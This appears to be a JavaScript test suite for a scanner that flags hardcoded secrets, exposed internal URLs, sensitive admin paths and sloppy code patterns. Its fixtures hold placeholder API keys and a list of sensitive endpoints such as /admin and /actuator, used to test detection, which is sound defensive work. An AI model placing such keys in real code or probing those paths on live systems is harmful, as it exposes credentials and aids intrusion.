    { path: 'demo.js', axes: { A: 30, B: 15, C: 10 }, breakdown: {}, lineCount: 80, roleWeight: 1 },
    { path: 'other.js', axes: { A: 5, B: 0, C: 0 }, breakdown: {}, lineCount: 80, roleWeight: 1 },
  ],
  secrets: [], exposure: [], review: [], slopBreakdown: [], cleanFiles: [],
  patternHits: [
    { ruleId: 'empty-catch', ruleName: 'Empty catch', category: 'error-handling', severity: 8, file: 'demo.js', line: 4, source: 'catch(e) {}', fix: 'Handle error' },
  ],
};
var phVisFiltered = L15.renderCli(phVisFilterReport, { verbose: true, file: 'nonexistent.js', targetPath: '/tmp/test', thresholds: L15.DEFAULT_THRESHOLDS });
assert(phVisFiltered.indexOf('PATTERN HITS') === -1, 'ph-visual: fileFilter hides unmatched hits');

// Empty hits → no section
var phVisEmpty = {
  projectSummary: { axes: { A: 0, B: 0, C: 0 }, verdicts: { A: 'Clean', B: 'Clean', C: 'Clean' }, fileCount: 1, totalLines: 10 },
  perFile: [{ path: 'ok.js', axes: { A: 0, B: 0, C: 0 }, breakdown: {}, lineCount: 10, roleWeight: 1 }],
  secrets: [], exposure: [], patternHits: [], slopBreakdown: [], review: [], cleanFiles: [],
};
var phVisEmptyOut = L15.renderCli(phVisEmpty, { verbose: true, targetPath: '/tmp/test', thresholds: L15.DEFAULT_THRESHOLDS });
assert(phVisEmptyOut.indexOf('PATTERN HITS') === -1, 'ph-visual: empty hits → no section');

// --- Pipeline Runner integration ---
section('Pipeline Runner');

var runner = require('../src/pipeline/runner.js');

// Run on fixtures directory
var l15RunResult = runner.run('test/fixtures');
assert(l15RunResult.report !== undefined, 'runner: returns report');
assert(l15RunResult.registry !== undefined, 'runner: returns registry');
assert(l15RunResult.calibration !== undefined, 'runner: returns calibration');
assert(l15RunResult.correlation !== undefined, 'runner: returns correlation');
assert(l15RunResult.scoring !== undefined, 'runner: returns scoring');
assert(l15RunResult.report.projectSummary.fileCount > 0, 'runner: scanned files');
assert(typeof l15RunResult.report.projectSummary.axes.A === 'number', 'runner: Axis A is number');
assert(typeof l15RunResult.report.projectSummary.axes.B === 'number', 'runner: Axis B is number');
assert(typeof l15RunResult.report.projectSummary.axes.C === 'number', 'runner: Axis C is number');
assert(l15RunResult.report.projectSummary.verdicts.A !== undefined, 'runner: has Axis A verdict');
assert(Array.isArray(l15RunResult.report.secrets), 'runner: report has secrets array');
assert(Array.isArray(l15RunResult.report.patternHits), 'runner: report has patternHits array');
assert(Array.isArray(l15RunResult.report.review), 'runner: report has review array');
assert(Array.isArray(l15RunResult.report.cleanFiles), 'runner: report has cleanFiles array');

// Sloppy fixture should produce hits
assert(l15RunResult.report.patternHits.length > 0, 'runner: sloppy fixture produces pattern hits');
// Some files should be clean
assert(l15RunResult.report.cleanFiles.length > 0, 'runner: clean fixture produces clean files');

// --- L11 Cross-File Correlation ---
section('L11 — Cross-file correlation');

var L11 = require('../src/pipeline/L11-correlation.js');

// Empty registry
var l11Empty = L11.correlate([]);
assert(l11Empty.duplicateSecrets.length === 0,  'L11: empty registry → no duplicate secrets');
assert(l11Empty.slopClusters.length === 0,      'L11: empty registry → no slop clusters');
assert(l11Empty.urlCrossRef.length === 0,        'L11: empty registry → no URL cross-refs');
assert(l11Empty.clonePollutionMap.length === 0, 'L11: empty registry → no clone pollution');

// Duplicate secrets: same value in 2 files
var l11DupReg = [
  { filePath: 'src/a.js', findings: [{ value: 'sk_live_abc123def456', lineIndex: 5, confidence: 'HIGH' }], patternHits: [], urlFindings: [] },
  { filePath: 'src/b.js', findings: [{ value: 'sk_live_abc123def456', lineIndex: 10, confidence: 'HIGH' }], patternHits: [], urlFindings: [] },
  { filePath: 'src/c.js', findings: [{ value: 'different_secret_xyz', lineIndex: 2, confidence: 'MEDIUM' }], patternHits: [], urlFindings: [] },
];
var l11DupResult = L11.correlate(l11DupReg);
assert(l11DupResult.duplicateSecrets.length === 1, 'L11: one duplicate secret found across 2 files');
assert(l11DupResult.duplicateSecrets[0].fileCount === 2, 'L11: duplicate secret appears in exactly 2 files');
assert(l11DupResult.duplicateSecrets[0].value === 'sk_live_abc123def456', 'L11: correct secret value reported');

// No duplicates when each secret is unique
var l11NoDupReg = [
  { filePath: 'src/a.js', findings: [{ value: 'unique_secret_aaa', lineIndex: 0, confidence: 'HIGH' }], patternHits: [], urlFindings: [] },
  { filePath: 'src/b.js', findings: [{ value: 'unique_secret_bbb', lineIndex: 0, confidence: 'HIGH' }], patternHits: [], urlFindings: [] },
];
assert(L11.correlate(l11NoDupReg).duplicateSecrets.length === 0, 'L11: no duplicates when secrets are unique');

// Slop clusters: 3 files in same dir with same dominant category
var l11SlopReg = [
  { relativePath: 'src/gen/a.js', findings: [], patternHits: [
    { category: 'verbosity' }, { category: 'verbosity' }, { category: 'dead-code' },
  ], urlFindings: [] },
  { relativePath: 'src/gen/b.js', findings: [], patternHits: [
    { category: 'verbosity' }, { category: 'verbosity' },
  ], urlFindings: [] },
  { relativePath: 'src/gen/c.js', findings: [], patternHits: [
    { category: 'verbosity' }, { category: 'verbosity' }, { category: 'verbosity' },
  ], urlFindings: [] },
  { relativePath: 'src/other/d.js', findings: [], patternHits: [
    { category: 'security' },
  ], urlFindings: [] },
];
var l11SlopResult = L11.correlate(l11SlopReg);
assert(l11SlopResult.slopClusters.length === 1, 'L11: one slop cluster detected');
assert(l11SlopResult.slopClusters[0].category === 'verbosity', 'L11: cluster category is verbosity');
assert(l11SlopResult.slopClusters[0].fileCount === 3, 'L11: cluster has 3 files');
assert(l11SlopResult.slopClusters[0].directory === 'src/gen', 'L11: cluster directory is src/gen');

// No cluster when only 2 files share a category
var l11NoCluster = [
  { relativePath: 'dir/a.js', findings: [], patternHits: [{ category: 'verbosity' }], urlFindings: [] },
  { relativePath: 'dir/b.js', findings: [], patternHits: [{ category: 'verbosity' }], urlFindings: [] },
];
assert(L11.correlate(l11NoCluster).slopClusters.length === 0, 'L11: no cluster with only 2 files');

// URL cross-references: same internal URL in 2 files
var l11UrlReg = [
  { filePath: 'src/a.js', findings: [], patternHits: [], urlFindings: [
    { url: 'http://10.0.1.5/api/data', classification: 'internal-exposed' },
  ] },
  { filePath: 'src/b.js', findings: [], patternHits: [], urlFindings: [
    { url: 'http://10.0.1.5/api/data', classification: 'internal-exposed' },
  ] },
  { filePath: 'src/c.js', findings: [], patternHits: [], urlFindings: [
    { url: 'https://cdn.example.com/logo.png', classification: 'safe-external' },
  ] },
];
var l11UrlResult = L11.correlate(l11UrlReg);
assert(l11UrlResult.urlCrossRef.length === 1, 'L11: one internal URL cross-ref found');
assert(l11UrlResult.urlCrossRef[0].fileCount === 2, 'L11: cross-ref appears in 2 files');
assert(l11UrlResult.urlCrossRef[0].url === 'http://10.0.1.5/api/data', 'L11: correct URL in cross-ref');

// No cross-ref for safe-external URLs
assert(l11UrlResult.urlCrossRef.every(function (r) { return r.url !== 'https://cdn.example.com/logo.png'; }),
       'L11: safe-external URLs not tracked in cross-refs');

// Clone pollution: same function name in 2 files via clone-pollution hits
var l11CloneReg = [
  { filePath: 'src/a.js', findings: [], patternHits: [
    { category: 'clone-pollution', line: 'function fetchUsers() {' },
  ], urlFindings: [] },
  { filePath: 'src/b.js', findings: [], patternHits: [
    { category: 'clone-pollution', line: 'function fetchUsers() {' },
  ], urlFindings: [] },
];
var l11CloneResult = L11.correlate(l11CloneReg);
assert(l11CloneResult.clonePollutionMap.length === 1, 'L11: one clone pollution entry found');
assert(l11CloneResult.clonePollutionMap[0].functionName === 'fetchusers', 'L11: correct function name (lowercased)');
assert(l11CloneResult.clonePollutionMap[0].fileCount === 2, 'L11: clone appears in 2 files');

// Output shape check
assert(typeof l11Empty.duplicateSecrets === 'object' && Array.isArray(l11Empty.duplicateSecrets),  'L11: output has duplicateSecrets array');
assert(typeof l11Empty.slopClusters     === 'object' && Array.isArray(l11Empty.slopClusters),      'L11: output has slopClusters array');
assert(typeof l11Empty.urlCrossRef      === 'object' && Array.isArray(l11Empty.urlCrossRef),       'L11: output has urlCrossRef array');
assert(typeof l11Empty.clonePollutionMap === 'object' && Array.isArray(l11Empty.clonePollutionMap),'L11: output has clonePollutionMap array');

// --- L10 Pattern Rule Engine ---
section('L10 — Pattern rule engine');

var L10 = require('../src/pipeline/L10-patterns.js');
var allRules = require('../src/rules.js');

// Helper: find rule by id
function findRule(id) {
  return allRules.find(function (r) { return r.id === id; });
}

// applyRules: empty string returns empty array
assert(L10.applyRules('', {}).length === 0, 'L10: empty content returns no hits');

// applyRules: fires the correct rules from the existing v0 set
var l10Content = [
  "var x = a > 0 ? a > 10 ? a > 100 ? 'big' : 'med' : 'sm' : 'neg';",  // excessive-ternary-nesting
  "console.log('debug');",                                                 // console-log-leftover
  "eval('bad()');",                                                        // eval-usage
  "var apiKey = 'sk_live_supersecretkeythatislong';",                      // hardcoded-secret
].join('\n');

var l10Result = L10.applyRules(l10Content, { filePath: '/app/index.js' });
var l10Ids = l10Result.map(function (h) { return h.ruleId; });
assert(l10Ids.indexOf('excessive-ternary-nesting') !== -1, 'L10: fires excessive-ternary-nesting');
assert(l10Ids.indexOf('console-log-leftover')      !== -1, 'L10: fires console-log-leftover');
assert(l10Ids.indexOf('eval-usage')                !== -1, 'L10: fires eval-usage');
assert(l10Ids.indexOf('hardcoded-secret')          !== -1, 'L10: fires hardcoded-secret');

// Hit object shape check
var l10Hit = l10Result[0];
assert(typeof l10Hit.ruleId    === 'string', 'L10 hit: has ruleId string');
assert(typeof l10Hit.severity  === 'number', 'L10 hit: has severity number');
assert(typeof l10Hit.category  === 'string', 'L10 hit: has category string');
assert(typeof l10Hit.line      === 'string', 'L10 hit: has line string');
assert(typeof l10Hit.lineIndex === 'number', 'L10 hit: has lineIndex number');
assert(typeof l10Hit.fix       === 'string', 'L10 hit: has fix string');

// applyRules: context-aware rules use role from fileRecord
var l10BackendContent = 'localStorage.setItem("foo", bar);';
var l10BackendResult = L10.applyRules(l10BackendContent, { isBackend: true });
var l10FrontResult   = L10.applyRules(l10BackendContent, { isBackend: false });
assert(l10BackendResult.map(function (h) { return h.ruleId; }).indexOf('localstorage-in-backend') !== -1,
       'L10: localstorage-in-backend fires for backend file');
assert(l10FrontResult.map(function (h) { return h.ruleId; }).indexOf('localstorage-in-backend') === -1,
       'L10: localstorage-in-backend does NOT fire for frontend file');

// --- Tier 1 rules ---

// type-theater: `: any` annotation
var rTypeTheater = findRule('type-theater');
assert(rTypeTheater.test('function foo(x: any) { return x; }', {}), 'type-theater: fires on `: any`');
assert(!rTypeTheater.test('function foo(x: string) { return x; }', {}), 'type-theater: does not fire on typed arg');
assert(!rTypeTheater.test('// the type is any old string', {}), 'type-theater: does not fire inside comment');

// config-exposure: env var with hardcoded fallback
var rConfigExp = findRule('config-exposure');
assert(rConfigExp.test("const s = process.env.SECRET_KEY || 'fallback';", {}), 'config-exposure: fires on SECRET_KEY || fallback');
assert(!rConfigExp.test("const s = process.env.NODE_ENV || 'development';", {}), 'config-exposure: does not fire on NODE_ENV (no key/secret name)');

// async-abuse: forEach(async)
var rAsyncAbuse = findRule('async-abuse');
assert(rAsyncAbuse.test('items.forEach(async (item) => {', {}), 'async-abuse: fires on forEach(async)');
assert(!rAsyncAbuse.test('items.map(async (item) => {', {}), 'async-abuse: does not fire on map(async)');

// structure-smell: 20 spaces of indent
var rStructSmell = findRule('structure-smell');
assert(rStructSmell.test('                    return doSomething();', {}), 'structure-smell: fires on ≥20 spaces');
assert(!rStructSmell.test('    return x;', {}), 'structure-smell: does not fire on shallow indent');
assert(!rStructSmell.test('', {}), 'structure-smell: does not fire on blank line');

// Data nesting exclusions (Bug #3): deeply indented data lines should not fire
assert(!rStructSmell.test('                    this.createVertexTemplateEntry(s + "shape;",', {}), 'structure-smell: skips this.method() at deep indent');
assert(!rStructSmell.test('                    self.addPalette("name", true);', {}), 'structure-smell: skips self.method() at deep indent');
assert(!rStructSmell.test('                    sb.createVertexTemplateFromCells([bg1], w, h);', {}), 'structure-smell: skips sb.method() at deep indent');
assert(!rStructSmell.test("                    'fillColor=#03B5BB;gradientColor=none;'", {}), 'structure-smell: skips string literal at deep indent');
assert(!rStructSmell.test('                    60, 72, "", "Name", null, null);', {}), 'structure-smell: skips number/arg list at deep indent');
assert(!rStructSmell.test('                    var bg1 = new mxCell();', {}), 'structure-smell: skips var declaration at deep indent');
assert(!rStructSmell.test('                    const x = getValue();', {}), 'structure-smell: skips const declaration at deep indent');
assert(!rStructSmell.test('                    mxUtils.bind(this, function() {', {}), 'structure-smell: skips chained method call at deep indent');
assert(!rStructSmell.test('                    w * 0.455, h * 0.26, "", "Arrow SE", null);', {}), 'structure-smell: skips continuation args at deep indent');
assert(!rStructSmell.test('                    new mxGeometry(0.15, 0.5, 20, 20)', {}), 'structure-smell: skips new constructor at deep indent');
assert(!rStructSmell.test('                    {id: "foo", name: "bar"},', {}), 'structure-smell: skips object literal entry at deep indent');
assert(!rStructSmell.test('                    {title: "Section A"},', {}), 'structure-smell: skips object literal title entry at deep indent');
assert(!rStructSmell.test('                    });', {}), 'structure-smell: skips closing }); at deep indent');
assert(!rStructSmell.test('                    }));', {}), 'structure-smell: skips closing })); at deep indent');
assert(!rStructSmell.test('                    content.style.display = "none";', {}), 'structure-smell: skips property assignment at deep indent');
assert(!rStructSmell.test('                    canvas.width = 200;', {}), 'structure-smell: skips property assignment at deep indent (2)');
// Logic nesting should still fire
assert(rStructSmell.test('                    if (x > 0) {', {}), 'structure-smell: fires on if at deep indent');
assert(rStructSmell.test('                    for (var i = 0; i < n; i++) {', {}), 'structure-smell: fires on for at deep indent');
assert(rStructSmell.test('                    while (running) {', {}), 'structure-smell: fires on while at deep indent');
assert(rStructSmell.test('                    switch (mode) {', {}), 'structure-smell: fires on switch at deep indent');

// error-silencing: catch + console.error only
var rErrSilence = findRule('error-silencing');
var errCtx = {
  lineIndex: 0,
  lines: ['} catch (err) {', '  console.error(err);', '}'],
};
assert(rErrSilence.test('} catch (err) {', errCtx), 'error-silencing: fires when catch only logs');
var errCtxRecover = {
  lineIndex: 0,
  lines: ['} catch (err) {', '  console.error(err);', '  throw err;', '}'],
};
assert(!rErrSilence.test('} catch (err) {', errCtxRecover), 'error-silencing: does not fire when catch re-throws');

// --- Tier 2 rules ---

// naming-entropy: single-letter var outside loop
var rNaming = findRule('naming-entropy');
assert(rNaming.test('var u = getUser();', {}), 'naming-entropy: fires on single-letter var `u`');
assert(!rNaming.test('var id = getId();', {}), 'naming-entropy: does not fire on multi-char name');
assert(!rNaming.test('for (var i = 0; i < n; i++) {', {}), 'naming-entropy: does not fire inside for');
assert(!rNaming.test('var e = new Error();', {}), 'naming-entropy: does not fire on `e` (error convention)');

// magic-values: large bare number in expression
var rMagic = findRule('magic-values');
assert(rMagic.test('if (timeout > 30000) throw new Error();', {}), 'magic-values: fires on > 30000');
assert(!rMagic.test('const TIMEOUT_MS = 30000;', {}), 'magic-values: does not fire on UPPER_SNAKE constant');
assert(!rMagic.test('var x = 42;', {}), 'magic-values: does not fire on small 2-digit number');
assert(!rMagic.test("var end = str.slice(pos, pos + 1024);", {}), 'magic-values: does not fire on offset in slice()');
assert(!rMagic.test("if (href.lastIndexOf('/', 1000) !== -1) {", {}), 'magic-values: does not fire on offset in lastIndexOf()');
assert(!rMagic.test("return s.substring(start, start + 4096);", {}), 'magic-values: does not fire on offset in substring()');

// import-hygiene: namespace import
var rImport = findRule('import-hygiene');
assert(rImport.test("import * as Utils from './utils';", {}), 'import-hygiene: fires on import *');
assert(!rImport.test("import { foo } from './utils';", {}), 'import-hygiene: does not fire on named import');

// --- Tier 3 rules ---

// test-theater: trivially passing assertion
var rTestTheater = findRule('test-theater');
assert(rTestTheater.test('expect(true).toBeTruthy();', {}), 'test-theater: fires on expect(true)');
assert(rTestTheater.test('assert(true)', {}), 'test-theater: fires on assert(true)');
assert(!rTestTheater.test('expect(result).toBe(42);', {}), 'test-theater: does not fire on real assertion');

// scaffold-residue: boilerplate placeholder comment
var rScaffold = findRule('scaffold-residue');
assert(rScaffold.test('// add your code here', {}), 'scaffold-residue: fires on "add your code here"');
assert(rScaffold.test('// your logic here', {}), 'scaffold-residue: fires on "your logic here"');
assert(!rScaffold.test('// this code handles auth', {}), 'scaffold-residue: does not fire on real comment');

// comment-mismatch: TODO inside implemented code
var rCommentMismatch = findRule('comment-mismatch');
var cmCtx = {
  lineIndex: 5,
  lines: [
    'function handleAuth(user) {',
    '  const session = createSession(user);',
    '  validatePermissions(session);',
    '  const token = signToken(session);',
    '  saveToRedis(session);',
    '  // TODO: implement token validation',
    '  return token;',
    '}',
  ],
};
assert(rCommentMismatch.test('  // TODO: implement token validation', cmCtx),
       'comment-mismatch: fires when TODO exists in implemented function body');

// --- Tier 4 rules ---

// promise-graveyard: floating fetch
var rPromise = findRule('promise-graveyard');
assert(rPromise.test('fetch("/api/users");', {}), 'promise-graveyard: fires on floating fetch');
assert(!rPromise.test('const result = await fetch("/api");', {}), 'promise-graveyard: does not fire on awaited fetch');
assert(!rPromise.test('return fetch("/api");', {}), 'promise-graveyard: does not fire on returned fetch');

// accessor-bloat: trivial getter
var rAccessor = findRule('accessor-bloat');
var abCtx = { lineIndex: 0, lines: ['get name() {', '  return this._name;', '}'] };
assert(rAccessor.test('get name() {', abCtx), 'accessor-bloat: fires on trivial getter');
var abCtx2 = { lineIndex: 0, lines: ['get name() {', '  return this._name.trim();', '}'] };
assert(!rAccessor.test('get name() {', abCtx2), 'accessor-bloat: does not fire when getter transforms value');

// --- L09 URL Topology ---
section('L09 — URL topology analysis');

var L09 = require('../src/pipeline/L09-url.js');

// --- URL parser ---
var l09Parsed1 = L09._parseUrl('https://api.example.com:8080/v1/users?token=abc&id=1#section');
assert(l09Parsed1.scheme   === 'https',           'L09 parser: scheme is https');
assert(l09Parsed1.host     === 'api.example.com', 'L09 parser: host is api.example.com');
assert(l09Parsed1.port     === '8080',            'L09 parser: port is 8080');
assert(l09Parsed1.path     === '/v1/users',       'L09 parser: path is /v1/users');
assert(l09Parsed1.query    === 'token=abc&id=1',  'L09 parser: query string is correct');
assert(l09Parsed1.fragment === 'section',         'L09 parser: fragment is section');

// No path URL
var l09Parsed2 = L09._parseUrl('http://localhost');
assert(l09Parsed2.host === 'localhost', 'L09 parser: handles URL with no path');
assert(l09Parsed2.path === '',          'L09 parser: path is empty when absent');

// No query URL
var l09Parsed3 = L09._parseUrl('https://example.com/path/to/resource');
assert(l09Parsed3.query === '', 'L09 parser: query is empty when absent');

// --- Internal host classification ---
assert(L09._isInternal('10.0.1.5'),             'L09 internal: 10.x is private');
assert(L09._isInternal('192.168.1.100'),         'L09 internal: 192.168.x is private');
assert(L09._isInternal('172.20.0.1'),            'L09 internal: 172.20.x is private');
assert(L09._isInternal('127.0.0.1'),             'L09 internal: 127.x is loopback');
assert(L09._isInternal('localhost'),             'L09 internal: localhost is internal');
assert(L09._isInternal('service.svc'),           'L09 internal: .svc TLD is internal');
assert(L09._isInternal('api.cluster.local'),     'L09 internal: .cluster.local is internal');
assert(L09._isInternal('db.internal'),           'L09 internal: .internal TLD is internal');
assert(L09._isInternal('server.lan'),            'L09 internal: .lan TLD is internal');
assert(!L09._isInternal('api.example.com'),      'L09 internal: public host is NOT internal');
assert(!L09._isInternal('8.8.8.8'),              'L09 internal: public IP is NOT internal');

// --- Sensitive path classification ---
assert(L09._isSensitivePath('/admin'),                 'L09 path: /admin is sensitive');
assert(L09._isSensitivePath('/admin/users'),           'L09 path: /admin/users is sensitive');
assert(L09._isSensitivePath('/api/v1/actuator/health'),'L09 path: /actuator mid-path is sensitive');
assert(L09._isSensitivePath('/metrics'),               'L09 path: /metrics is sensitive');
assert(L09._isSensitivePath('/debug'),                 'L09 path: /debug is sensitive');
assert(!L09._isSensitivePath('/api/v1/users'),         'L09 path: normal API path is NOT sensitive');
assert(!L09._isSensitivePath('/'),                     'L09 path: root path is NOT sensitive');

// --- Query string parser ---
var l09Params = L09._parseQuery('token=abc123&id=42&empty=');
assert(l09Params.length === 1 || l09Params.length === 2, 'L09 query: 2 non-trivial params parsed (empty filtered)');
var l09ParamKeys = l09Params.map(function (p) { return p.key; });
assert(l09ParamKeys.indexOf('token') !== -1, 'L09 query: token param found');

var l09EmptyQuery = L09._parseQuery('');
assert(l09EmptyQuery.length === 0, 'L09 query: empty string → no params');

var l09NoEq = L09._parseQuery('noequalssign');
assert(l09NoEq.length === 0, 'L09 query: param without = is skipped');

// --- analyseUrls: empty input ---
assert(L09.analyseUrls([]).length === 0, 'L09 analyseUrls: empty input returns []');

// Helper for building URL candidates
function makeUrlCand(url, lineIndex) {
  return { value: url, line: 'var x = "' + url + '"', col: 9,
           lineIndex: lineIndex || 0, identifierName: null,
           callSiteContext: null, type: 'url', priority: 'normal' };
}

// internal-exposed: RFC 1918 host
var l09IntResult = L09.analyseUrls([makeUrlCand('http://10.0.1.5/api/data')]);
assert(l09IntResult.length === 1,                            'L09 analyseUrls: returns one result per URL');
assert(l09IntResult[0].classification === 'internal-exposed','L09 analyseUrls: 10.x host → internal-exposed');
assert(l09IntResult[0].internal === true,                    'L09 analyseUrls: internal flag true for private IP');

// internal-exposed: .internal TLD
var l09IntTld = L09.analyseUrls([makeUrlCand('https://db.internal/query')]);
assert(l09IntTld[0].classification === 'internal-exposed', 'L09 analyseUrls: .internal TLD → internal-exposed');

// safe-external: public CDN
var l09ExtResult = L09.analyseUrls([makeUrlCand('https://cdn.example.com/logo.png')]);
assert(l09ExtResult[0].classification === 'safe-external', 'L09 analyseUrls: CDN URL → safe-external');
assert(l09ExtResult[0].internal === false,                 'L09 analyseUrls: internal flag false for public host');

// suspicious-external: plain http + sensitive path
var l09SuspResult = L09.analyseUrls([makeUrlCand('http://api.example.com/admin/settings')]);
assert(l09SuspResult[0].sensitivePath === true,                  'L09 analyseUrls: /admin path detected');
assert(l09SuspResult[0].classification === 'suspicious-external','L09 analyseUrls: http+admin path → suspicious-external');

// Result shape check
var l09Shape = l09IntResult[0];
assert(typeof l09Shape.url            === 'string', 'L09 result has url');
assert(typeof l09Shape.parsed         === 'object', 'L09 result has parsed');
assert(typeof l09Shape.classification === 'string', 'L09 result has classification');
assert(Array.isArray(l09Shape.queryFindings),        'L09 result has queryFindings array');
assert(Array.isArray(l09Shape.queryReview),          'L09 result has queryReview array');

// --- L06 Herd Discrimination ---
section('L06 — Herd discrimination');

var L06 = require('../src/pipeline/L06-herd.js');

// Helper: build minimal candidate object
function makeCand(value, lineIndex, identifierName) {
  return { value: value, line: 'x', col: 0, lineIndex: lineIndex,
           identifierName: identifierName || null, callSiteContext: null,
           type: 'string', priority: 'normal' };
}

// Uniform hex hashes (herd): similar entropy → low variance → IHD < 1.5 → discarded
var l06HexHerd = [
  makeCand('a1b2c3d4e5f6a1b2', 0),
  makeCand('b2c3d4e5f6a1b2c3', 1),
  makeCand('c3d4e5f6a1b2c3d4', 2),
  makeCand('d4e5f6a1b2c3d4e5', 3),
];
var l06HerdResult = L06.discriminate(l06HexHerd);
assert(l06HerdResult.length === 0, 'L06: uniform hex herd discarded (IHD below threshold)');

// Small group (< MIN_HERD_SIZE=3): always escalated
var l06Small = [makeCand('sk_live_abc123def456', 0), makeCand('ghp_realtoken789xyz', 5)];
var l06SmallResult = L06.discriminate(l06Small);
assert(l06SmallResult.length === 2, 'L06: small group (< min herd size) always escalated');

// Isolated candidate: always escalated
var l06Single = [makeCand('sk_live_abc123def456ghi789', 0)];
assert(L06.discriminate(l06Single).length === 1, 'L06: single isolated candidate escalated');

// _cluster: same identifierName groups candidates regardless of line distance
var l06SameIdent = [
  makeCand('valA', 0, 'DB_PASS'),
  makeCand('valB', 100, 'DB_PASS'),
];
var l06Clusters = L06._cluster(l06SameIdent);
assert(l06Clusters.length === 1, 'L06: same identifierName clusters even with large line gap');

// _variance: uniform array has 0 variance
var l06Vars = L06._variance([3, 3, 3, 3], L06._mean([3, 3, 3, 3]));
assert(l06Vars === 0, 'L06: _variance of uniform array is 0');

// --- L07 Deep Analysis ---
section('L07 — Deep analysis');

var L07 = require('../src/pipeline/L07-deep.js');

// Index of Coincidence: English-like text ≈ 0.065
var l07IcEnglish = L07._indexOfCoincidence('abcdeabcdeabcdeabcde');
assert(l07IcEnglish > 0.05, 'L07: IC of repeated pattern > 0.05 (got ' + l07IcEnglish.toFixed(4) + ')');

// IC of truly random-looking token is low
var l07IcRandom = L07._indexOfCoincidence('Xk7mR9qL2wF5nT3vBj8YpAs');
assert(l07IcRandom < 0.10, 'L07: IC of random token < 0.10 (got ' + l07IcRandom.toFixed(4) + ')');

// Class transition friction: mixed chars → high
var l07CtfHigh = L07._classTransitionFriction('aB1!cD2#eF');
assert(l07CtfHigh > 0.4, 'L07: mixed-class string CTF > 0.4 (got ' + l07CtfHigh.toFixed(3) + ')');

// CTF: pure lowercase → 0
var l07CtfLow = L07._classTransitionFriction('abcdefghijk');
assert(l07CtfLow === 0, 'L07: pure lowercase CTF = 0');

// Entropy gradient: 3 segments returned
var l07Egs = L07._entropyGradient('abcdefghijklmnopqrstuvwxyz');
assert(l07Egs.length === 3, 'L07: entropyGradient returns 3 segments');
assert(typeof l07Egs[0] === 'number', 'L07: gradient segment is a number');

// Short string → [0,0,0]
var l07EgsShort = L07._entropyGradient('abc');
assert(l07EgsShort[0] === 0, 'L07: short string gradient is [0,0,0]');

// Uniformity filter: perfectly uniform distribution of many chars → true
var l07UniTrue = 'abcdefghijklmnopqrstuvwxyz01'; // 28 unique in 28 chars
assert(L07._uniformitySignal(l07UniTrue) === true, 'L07: uniform dist string → uniformity=true');

// Short string → not uniform
assert(L07._uniformitySignal('abc') === false, 'L07: short string → uniformity=false');

// deepAnalysis: returns signal set per candidate
var l07Cands = [makeCand('sk_live_abc123def456ghi789jkl012mno345', 0)];
var l07Results = L07.deepAnalysis(l07Cands);
assert(l07Results.length === 1, 'L07: deepAnalysis returns one result per candidate');
assert(typeof l07Results[0].signals === 'object', 'L07: result has signals object');
assert(typeof l07Results[0].signals.maxPipelineScore === 'number', 'L07: signals has maxPipelineScore');
assert(typeof l07Results[0].signals.ic              === 'number', 'L07: signals has ic');
assert(typeof l07Results[0].signals.ctf             === 'number', 'L07: signals has ctf');
assert(Array.isArray(l07Results[0].signals.egs),                  'L07: signals has egs array');

// deepAnalysis: empty input
assert(L07.deepAnalysis([]).length === 0, 'L07: empty input returns empty array');

// --- L08 Arbitration ---
section('L08 — Confidence arbitration');

var L08 = require('../src/pipeline/L08-arbitration.js');

// Helper: build a signal set for testing
function makeSignalSet(pipelineScore, icSignal, ctfSignal, egsSpike, uniformity) {
  return {
    candidate: makeCand('test-value-abc-def-ghi', 0),
    subResults: [{ value: 'test-value-abc-def-ghi', resolvedScore: pipelineScore }],
    signals: {
      maxPipelineScore: pipelineScore,
      ic: 0.04, icSignal: icSignal ? 1 : 0,
      ctf: 0.5, ctfSignal: ctfSignal ? 1 : 0,
      egs: [3, 3, 3], egsSpike: egsSpike || false,
      uniformity: uniformity || false,
    },
  };
}

// HIGH: pipeline >= 0.65 AND >= 2 other signals
var l08High = L08.arbitrate([makeSignalSet(0.70, true, true, false, false)]);
assert(l08High.findings.length === 1, 'L08: HIGH confidence → goes to findings');
assert(l08High.findings[0].confidence === 'HIGH', 'L08: confidence tier is HIGH');
assert(l08High.review.length === 0, 'L08: HIGH has no review items');

// MEDIUM: pipeline >= 0.50 AND >= 2 other signals (Fix 4: raised from 1 to 2)
var l08Med = L08.arbitrate([makeSignalSet(0.55, true, true, false, false)]);
assert(l08Med.findings.length === 1, 'L08: MEDIUM confidence → goes to findings');
assert(l08Med.findings[0].confidence === 'MEDIUM', 'L08: confidence tier is MEDIUM');

// Fix 4 regression: pipeline >= 0.50 with only 1 other signal → REVIEW, not MEDIUM
var l08MedSingle = L08.arbitrate([makeSignalSet(0.55, true, false, false, false)]);
assert(l08MedSingle.findings.length === 0, 'L08: single-signal MEDIUM → NOT in findings');
assert(l08MedSingle.review.length === 1,   'L08: single-signal MEDIUM → goes to review');

// UNCERTAIN: pipeline >= 0.40 but no other signals
var l08Uncertain = L08.arbitrate([makeSignalSet(0.42, false, false, false, false)]);
assert(l08Uncertain.review.length === 1, 'L08: UNCERTAIN → goes to review (not findings)');
assert(l08Uncertain.findings.length === 0, 'L08: UNCERTAIN has no findings');
assert(l08Uncertain.review[0].confidence === 'UNCERTAIN', 'L08: confidence is UNCERTAIN');

// SAFE: pipeline < 0.40 and no signals → discarded
var l08Safe = L08.arbitrate([makeSignalSet(0.20, false, false, false, false)]);
assert(l08Safe.findings.length === 0, 'L08: SAFE discarded from findings');
assert(l08Safe.review.length === 0,   'L08: SAFE discarded from review');

// Empty input
var l08Empty = L08.arbitrate([]);
assert(l08Empty.findings.length === 0 && l08Empty.review.length === 0, 'L08: empty input returns empty output');

// Finding shape check
assert(typeof l08High.findings[0].value           === 'string', 'L08: finding has value');
assert(typeof l08High.findings[0].pipelineScore   === 'number', 'L08: finding has pipelineScore');
assert(typeof l08High.findings[0].signalCount      === 'number', 'L08: finding has signalCount');

// Threshold constants exposed
assert(L08.HIGH_PIPELINE   === 0.65, 'L08: HIGH_PIPELINE threshold is 0.65');
assert(L08.MEDIUM_PIPELINE === 0.50, 'L08: MEDIUM_PIPELINE threshold is 0.50');
assert(L08.UNCERTAIN_FLOOR === 0.40, 'L08: UNCERTAIN_FLOOR is 0.40');

// --- MCP Scanner ---
section('MCP Scanner');

var mcpScanner = require('../src/pipeline/mcp-scanner.js');

// Unit: _isSecretLike
assert(mcpScanner._isSecretLike('sk-proj-abc123def456ghi789jkl012mno345pqr678stu901') === true, 'mcp: detects sk- prefix secret');
